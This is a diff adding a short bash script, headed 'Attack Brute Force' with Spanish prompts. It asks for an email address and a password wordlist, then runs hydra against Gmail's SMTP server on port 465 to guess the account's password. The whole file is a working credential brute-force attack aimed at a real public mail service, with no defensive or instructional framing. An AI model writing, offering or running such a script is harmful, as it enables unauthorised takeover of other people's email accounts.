@@ -1,0 +1,6 @@
+#!/bin/bash
+clear
+echo -e "\033[7m\033[36m Attack Brute Force \033[0m"
+read -p 'correo: ' correo; read -p 'diccionario: ' diccionario; hydra -l $correo -P $diccionario -s 465 -S -v -V -t 10 smtp.gmail.com smtp
+
+
